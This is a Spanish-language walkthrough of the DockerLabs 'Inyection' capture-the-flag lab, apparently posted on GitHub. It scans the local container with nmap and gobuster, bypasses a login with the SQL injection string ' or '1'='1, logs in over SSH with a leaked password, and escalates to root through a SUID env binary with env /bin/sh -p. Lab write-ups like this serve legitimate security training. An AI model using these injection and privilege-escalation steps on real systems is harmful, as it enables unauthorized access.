Inyection-DockerLabs🇪🇸


**1. En primer lugar vamos a desempaquetar los archivos facilitados y moverlo a nuestra área de práctica.**
```bash
unzip inyection.zip
```

<img width="875" height="506" alt="image" src="https://github.com/user-attachments/assets/c4999a56-e5f8-4180-aadb-ca78f86f10a5" />


**2. Ahora vamos a encender el laboratorio.**
```bash
sudo bash ./auto_deploy.sh injection.tar 
```

<img width="874" height="280" alt="image" src="https://github.com/user-attachments/assets/198ac899-4e91-4936-a7f9-5c0663230376" />


**3. Procederemos a comprobar la conexión  con un ping.**
```bash
 ping -c3 172.17.0.2
```

<img width="870" height="398" alt="image" src="https://github.com/user-attachments/assets/e064b2cf-81ad-40e6-8a08-de92304519e0" />


**4. Vamos a realizar un rastreo de puertos con nmap.**
```bash
nmap -sCV 172.17.0.2
```

<img width="867" height="469" alt="image" src="https://github.com/user-attachments/assets/4d88b5ed-3944-4d18-b2cd-65c88abdc991" />


**5. Con la herramienta de gobuster podremos ver las direcciones ocultas que haya.**
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -r
```

<img width="870" height="511" alt="image" src="https://github.com/user-attachments/assets/dfa4d9b8-079b-46be-bcbe-83f537df11e5" />


**6. Al ver en la páqina web unas casillas vacias haremos una inyección sql.**
```bash
user: admin
passwd: ' or '1'='1
```

<img width="1043" height="517" alt="image" src="https://github.com/user-attachments/assets/b31882dd-f6f2-4c45-854b-3ac25f38b1c1" />


**7. Ahora conociendo la contraseña y el usuario podremos hacer un ssh para acceder a la máquina.**
```bash
 ssh dylan@172.17.0.2
# passwd : KJSDFG789FGSDF78
```

<img width="867" height="521" alt="image" src="https://github.com/user-attachments/assets/dfcfa4a3-128b-497a-8122-432ae0c14819" />


**8. Vamos a comprobar los privilegios de los binarios que tiene este usuario con `sudo -l` y `find / -perm -4000` lista todos los ejecutables que corren con los privilegios de su propietario**

<img width="874" height="523" alt="image" src="https://github.com/user-attachments/assets/4571bdcc-d99d-4597-96d3-30f066ff69bd" />

*El cual destaca un permiso*

<img width="877" height="501" alt="image" src="https://github.com/user-attachments/assets/d0332072-a311-46f5-a878-2419c3dc9c56" />


**9. Al saber que puede ejecutar env ejecutaremos este comando para cambiar de shell y elevar el privilegio.**
```bash
env /bin/sh -p
```

<img width="882" height="82" alt="image" src="https://github.com/user-attachments/assets/396200e4-32a3-464b-83cc-5c15f88a4cce" />


